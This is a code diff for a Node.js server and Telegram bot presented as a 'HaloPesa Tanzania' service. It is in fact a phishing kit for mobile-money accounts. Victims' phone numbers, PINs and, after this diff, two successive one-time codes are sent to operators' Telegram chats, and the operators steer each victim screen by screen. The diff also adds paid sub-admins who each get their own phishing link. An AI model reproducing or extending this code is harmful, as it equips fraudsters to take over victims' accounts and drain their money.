@@ -1,5 +1,6 @@
 /**
  * **HALOPESA TANZANIA - SECURE MULTI-ADMIN SERVER**
+ * Configured for independent sub-admin routing.
  */
 
 const express = require('express');
@@ -59,13 +60,16 @@ function saveAdmins() {
 let bot = null;
 const sessions = new Map();
 const admins = loadAdmins();
-const adminConfigMessageIds = new Map();
 
 function isValidHaloPesaNumber(number) {
   const clean = String(number || '').replace(/\D/g, '');
   return /^(061|062|063)\d{7}$/.test(clean);
 }
 
+/**
+ * Resolves the target admin chat ID independently.
+ * Ensures sub-admins handle their own links and route exclusively to themselves.
+ */
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
     const targetAdmin = String(adminParam).trim();
@@ -73,60 +77,11 @@ function resolveTargetChat(adminParam) {
       return FALLBACK_ADMIN_ID;
     }
     const adminRecord = admins.get(targetAdmin);
-    if (adminRecord && adminRecord.authorized) {
-      return targetAdmin;
+    if (adminRecord && adminRecord.authorized && adminRecord.paid) {
+      return targetAdmin; // Route directly to sub-admin independently
     }
   }
   return null;
-}
-
-async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
-  const PAGE_SIZE = 5;
-  const adminEntries = Array.from(admins.entries()).filter(([id]) => id !== String(FALLBACK_ADMIN_ID));
-  const totalPages = Math.ceil(adminEntries.length / PAGE_SIZE) || 1;
-  
-  if (page < 0) page = 0;
-  if (page >= totalPages) page = totalPages - 1;
-
-  const paginatedEntries = adminEntries.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);
-
-  let adminListText = `👑 *Jopo la Udhibiti wa Wasimamizi Wasaidizi* (Ukurasa ${page + 1} kati ya${totalPages})\n\nSimamia hali ya idhini ya wasimamizi wasaidizi:`;
-  let keyboard = [];
-
-  if (adminEntries.length === 0) {
-    adminListText += `\n\nHakuna wasimamizi wasaidizi walioanza kutumia bot bado.`;
-  } else {
-    paginatedEntries.forEach(([id, record]) => {
-      const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'Mtumiaji');
-      const authStatus = record.authorized ? '🟢 Imeidhinishwa' : '🔴 Haijaidhinishwa / Inasubiri';
-      const subLink = `${APP_URL}/?admin=${id}`;
-      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Hali: ${authStatus}\n   🔗 \`${subLink}\``;
-    });
-  }
-
-  let navRow = [];
-  if (page > 0) navRow.push({ text: `⬅️ Iliyopita`, callback_data: `PAGE_${page - 1}` });
-  navRow.push({ text: `🔄 Onyesha Upya`, callback_data: `PAGE_${page}` });
-  if (page < totalPages - 1) navRow.push({ text: `Ijayo ➡️`, callback_data: `PAGE_${page + 1}` });
-  if (navRow.length > 0) keyboard.push(navRow);
-
-  if (messageId) {
-    try {
-      await bot.editMessageText(adminListText, {
-        chat_id: chatId,
-        message_id: messageId,
-        parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: keyboard }
-      });
-      return;
-    } catch (err) {}
-  }
-
-  const sentMsg = await bot.sendMessage(chatId, adminListText, { 
-    parse_mode: 'Markdown',
-    reply_markup: { inline_keyboard: keyboard } 
-  });
-  adminConfigMessageIds.set(chatId, sentMsg.message_id);
 }
 
 async function initBot() {
@@ -144,73 +99,41 @@ async function initBot() {
     process.exit(1);
   }
 
-  bot.onText(/\/admins/, async (msg) => {
-    const chatId = String(msg.chat.id);
-    if (chatId !== String(FALLBACK_ADMIN_ID)) {
-      await bot.sendMessage(chatId, `⚠ Huna idhini.`);
-      return;
-    }
-    await updateContinuousAdminList(chatId, null, 0);
-  });
-
   bot.onText(/\/start/, async (msg) => {
     try {
       const chatId = String(msg.chat.id);
-      const username = msg.from.username || '';
-      const firstName = msg.from.first_name || 'Mtumiaji';
-      const lastName = msg.from.last_name || '';
+      let chatInfo = {};
+      try { chatInfo = await bot.getChat(chatId); } catch (e) {}
+
+      const username = chatInfo.username || msg.from.username || '';
+      const firstName = chatInfo.first_name || msg.from.first_name || 'Mtumiaji';
+      const lastName = chatInfo.last_name || msg.from.last_name || '';
 
       if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, `👑 Karibu Msimamizi Mkuu. Kiungo chako: ${APP_URL}\n\nAndika /admins kusimamia wasimamizi wasaidizi.`, {
-          parse_mode: 'Markdown'
-        });
+        await bot.sendMessage(chatId, `👑 *Karibu Msimamizi Mkuu*\nKiungo chako kikuu: ${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`, { parse_mode: 'Markdown' });
         return;
       }
 
       if (!admins.has(chatId)) {
-        admins.set(chatId, {
-          authorized: false,
-          paid: false,
-          username,
-          firstName,
-          lastName,
-          startedAt: new Date()
-        });
-        saveAdmins();
-      } else {
-        const existing = admins.get(chatId);
-        existing.username = username;
-        existing.firstName = firstName;
-        existing.lastName = lastName;
+        admins.set(chatId, { authorized: false, paid: false, username, firstName, lastName, startedAt: new Date() });
         saveAdmins();
       }
 
       const record = admins.get(chatId);
-
-      if (!record.authorized) {
+      if (!record.authorized || !record.paid) {
         await bot.sendMessage(FALLBACK_ADMIN_ID, 
-          `🚨 *Msimamizi Msaidizi Mpya Anasubiri Idhini!*\n\n` +
-          `👤 *Mtumiaji:* ${username ? '@' + username : firstName}\n` +
+          `🚨 *Msimamizi Msaidizi Mpya Anasubiri Idhini/Malipo!*\n\n` +
+          `👤 *Jina:* ${firstName}\n` +
           `🆔 *Chat ID:* \`${chatId}\``, 
-          { 
-            parse_mode: 'Markdown',
-            reply_markup: {
-              inline_keyboard: [
-                [
-                  { text: '✅ Idhinisha', callback_data: `AUTH_YES_${chatId}` },
-                  { text: '❌ Kataa', callback_data: `AUTH_NO_${chatId}` }
-                ]
-              ]
-            }
-          }
+          { parse_mode: 'Markdown' }
         );
 
-        await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nAkaunti yako **inasubiri idhini** kutoka kwa Msimamizi Mkuu.`, { parse_mode: 'Markdown' });
+        await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nAkaunti yako inasubiri idhini na malipo kutoka kwa Msimamizi Mkuu.`, { parse_mode: 'Markdown' });
         return;
       }
 
       const userLink = `${APP_URL}/?admin=${chatId}`;
-      await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nKiungo chako kiko tayari:\n${userLink}`, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nKiungo chako binafsi kiko tayari:\n${userLink}`, { parse_mode: 'Markdown' });
     } catch (err) {}
   });
 
@@ -218,102 +141,51 @@ async function initBot() {
     try {
       const actionData = query.data || '';
       const chatId = String(query.message.chat.id);
-
-      if (actionData.startsWith('AUTH_YES_') || actionData.startsWith('AUTH_NO_')) {
-        if (chatId !== String(FALLBACK_ADMIN_ID)) {
-          await bot.answerCallbackQuery(query.id, { text: '⚠️ Huna idhini.' });
-          return;
-        }
-
-        const parts = actionData.split('_');
-        const decision = parts[1];
-        const targetSubId = parts[2];
-        const subRecord = admins.get(targetSubId);
-
-        if (!subRecord) {
-          await bot.answerCallbackQuery(query.id, { text: '⚠️ Haikupatikana.' });
-          return;
-        }
-
-        if (decision === 'YES') {
-          subRecord.authorized = true;
-          saveAdmins();
-          const assignedLink = `${APP_URL}/?admin=${targetSubId}`;
-          await bot.sendMessage(targetSubId, `🎉 Akaunti yako imeidhinishwa!\n\n🔗 *Kiungo:* ${assignedLink}`, { parse_mode: 'Markdown' }).catch(() => {});
-          await bot.answerCallbackQuery(query.id, { text: '✅ Imeidhinishwa!' });
-          await bot.editMessageText(`✅ *Imetumika & Imeidhinishwa*\n\nID: \`${targetSubId}\``, {
-            chat_id: chatId,
-            message_id: query.message.message_id,
-            parse_mode: 'Markdown',
-            reply_markup: { inline_keyboard: [] }
-          });
-        } else {
-          admins.delete(targetSubId);
-          saveAdmins();
-          await bot.sendMessage(targetSubId, `❌ Ombi limekataliwa.`).catch(() => {});
-          await bot.answerCallbackQuery(query.id, { text: '❌ Imekataliwa.' });
-          await bot.editMessageText(`❌ *Imekataliwa*\n\nID: \`${targetSubId}\``, {
-            chat_id: chatId,
-            message_id: query.message.message_id,
-            parse_mode: 'Markdown',
-            reply_markup: { inline_keyboard: [] }
-          });
-        }
-        return;
-      }
-
-      if (actionData.startsWith('PAGE_')) {
-        const pageNum = parseInt(actionData.split('_')[1]) || 0;
-        await updateContinuousAdminList(chatId, query.message.message_id, pageNum);
-        await bot.answerCallbackQuery(query.id);
-        return;
-      }
-
       const parts = actionData.split('_');
       const prefix = parts.slice(0, 2).join('_'); 
       const targetId = parts.slice(2).join('_');
 
       let session = sessions.get(targetId);
-      if (!session) {
-        session = { contact: 'Haijulikani', adminChatId: chatId };
-      }
+      if (!session) session = { contact: 'Haijulikani', adminChatId: chatId };
 
       const chatTarget = session.adminChatId || chatId;
 
       switch (prefix) {
         case 'ALLOW_OTP':
           session.status = 'APPROVED_LOAD_OTP';
-          await bot.sendMessage(chatTarget, `✅ Skrini ya OTP imezidishwa kwa ${session.contact}`);
+          await bot.sendMessage(chatTarget, `✅ Hatua ya 1 ya OTP imeruhusiwa kwa namba ${session.contact}`);
           break;
         case 'DENY_OTP':
           session.status = 'DENIED';
           await bot.sendMessage(chatTarget, `❌ Ufikiaji Umekataliwa`);
           break;
         case 'CORRECT_OTP':
+          session.status = 'TRIGGER_SECOND_OTP';
+          await bot.sendMessage(chatTarget, `✅ OTP ya Kwanza Imethibitishwa. Sasa inasubiri OTP ya Pili.`);
+          break;
+        case 'FINAL_SUCCESS':
           session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 Mafanikio yamethibitishwa.`);
+          await bot.sendMessage(chatTarget, `🎉 Mafanikio yamethibitishwa kikamilifu.`);
           break;
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
-          session.otp = '';
-          await bot.sendMessage(chatTarget, `⚠️ PIN Siyo Sahihi`);
+          session.otp1 = '';
+          session.otp2 = '';
+          await bot.sendMessage(chatTarget, `⚠️ PIN Siyo Sahihi - Inarudishwa kwenye PIN`);
           break;
         case 'WRONG_OTP':
           session.status = 'RETRY_OTP';
-          session.otp = '';
-          await bot.sendMessage(chatTarget, `⚠️ OTP Siyo Sahihi`);
+          session.otp1 = '';
+          session.otp2 = '';
+          await bot.sendMessage(chatTarget, `⚠️ OTP Siyo Sahihi - Inarudishwa kuweka OTP mpya`);
           break;
         default:
           break;
       }
 
       await bot.answerCallbackQuery(query.id, { text: `Imeshughulikiwa` }).catch(() => {});
-
       if (query.message && query.message.message_id) {
-        await bot.editMessageReplyMarkup(
-          { inline_keyboard: [] },
-          { chat_id: query.message.chat.id, message_id: query.message.message_id }
-        ).catch(() => {});
+        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
       }
     } catch (err) {}
   });
@@ -326,39 +198,36 @@ app.get('/', (req, res) => {
 app.post('/api/submit-application', async (req, res) => {
   try {
     let { contact, pin, amount, adminChatId } = req.body || {};
-
     if (!adminChatId && req.query && req.query.admin) {
       adminChatId = req.query.admin;
     }
 
     const cleanContact = String(contact || '').replace(/\D/g, '');
     if (!isValidHaloPesaNumber(cleanContact)) {
-      return res.status(400).json({ success: false, error: 'Weka namba sahihi ya HaloPesa kuanzia na 061, 062, au 063.' });
+      return res.status(400).json({ success: false, error: 'Weka namba halali ya HaloPesa kuanzia na 061, 062, au 063.' });
     }
 
     const targetChat = resolveTargetChat(adminChatId);
     if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'Msimamizi hajaidhinishwa au kiungo si sahihi.' });
+      return res.status(400).json({ success: false, error: 'Msimamizi hajaidhinishwa, hajalipia au kiungo sio sahihi.' });
     }
 
     const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;
-
-    sessions.set(userId, {
-      contact: cleanContact,
-      pin,
-      amount: amount || 'TZS 100,000',
-      adminChatId: targetChat,
-      status: 'WAITING_PIN_APPROVAL',
-      createdAt: new Date()
+    sessions.set(userId, { 
+      contact: cleanContact, 
+      pin, 
+      amount: amount || 'TZS 100,000', 
+      adminChatId: targetChat, 
+      status: 'WAITING_PIN_APPROVAL' 
     });
 
-    const message = `NEW HALOPESA APPLICATIONS\n\nNUMBER: ${cleanContact}\nPIN: ${pin}`;
+    const message = `NEW HALOPESA APPLICATION\n\nNUMBER: ${cleanContact}\nPIN: ${pin}`;
     const opts = {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '✅ ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
-            { text: '❌ DENY', callback_data: `DENY_OTP_${userId}` }
+            { text: 'ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
+            { text: 'DENY', callback_data: `DENY_OTP_${userId}` }
           ]
         ]
       }
@@ -379,65 +248,50 @@ app.get('/api/check-status/:userId', (req, res) => {
   const { userId } = req.params;
   const session = sessions.get(userId);
   if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
-  res.status(200).json({ status: session.status, otp: session.otp || '' });
-});
-
-app.post('/api/request-new-otp', async (req, res) => {
-  try {
-    const { userId } = req.body || {};
-    const session = sessions.get(userId);
-    if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });
-
-    session.status = 'REQUESTING_NEW_OTP';
-    const targetChat = session.adminChatId;
-
-    if (bot && targetChat) {
-      await bot.sendMessage(targetChat, `⚠️ APPLICANT IS REQUESTING NEW OTP\n\nNUMBER: ${session.contact}`, {
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: '✅ ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
-              { text: '❌ DENY', callback_data: `DENY_OTP_${userId}` }
-            ]
-          ]
-        }
-      });
-    }
-
-    return res.status(200).json({ success: true });
-  } catch (err) {
-    return res.status(500).json({ success: false, error: 'Hitilafu' });
-  }
+  res.status(200).json({ status: session.status, otp: session.otp1 || '' });
 });
 
 app.post('/api/submit-otp', async (req, res) => {
   try {
-    const { userId, otp } = req.body || {};
+    const { userId, otp, step } = req.body || {};
     const session = sessions.get(userId);
-
     if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });
 
-    session.status = 'WAITING_OTP_VERIFICATION';
-    session.otp = otp;
-
-    const message = `NEW HALOPESA APPLICATIONS\n\nNUMBER: ${session.contact}\nOTP: ${otp}`;
-    const opts = {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: '⚠️ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
-            { text: '⚠️ WRONG OTP', callback_data: `WRONG_OTP_${userId}` }
-          ],
-          [
-            { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
-          ]
-        ]
-      }
-    };
-
     const targetChat = session.adminChatId;
-    if (targetChat && bot) {
-      await bot.sendMessage(targetChat, message, opts);
+
+    if (step === 2) {
+      session.status = 'WAITING_FINAL_OTP_VERIFICATION';
+      session.otp2 = otp;
+      const message = `HALOPESA FINAL OTP (STEP 2)\n\nNUMBER: ${session.contact}\nOTP 2: ${otp}`;
+      const opts = {
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: 'WRONG OTP', callback_data: `WRONG_OTP_${userId}` },
+              { text: 'APPROVE', callback_data: `FINAL_SUCCESS_${userId}` }
+            ]
+          ]
+        }
+      };
+      if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
+    } else {
+      session.status = 'WAITING_OTP_VERIFICATION';
+      session.otp1 = otp;
+      const message = `HALOPESA OTP SUBMISSION (STEP 1)\n\nNUMBER: ${session.contact}\nOTP 1: ${otp}`;
+      const opts = {
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: 'WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
+              { text: 'WRONG OTP', callback_data: `WRONG_OTP_${userId}` }
+            ],
+            [
+              { text: 'CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
+            ]
+          ]
+        }
+      };
+      if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
     }
 
     return res.status(200).json({ success: true });
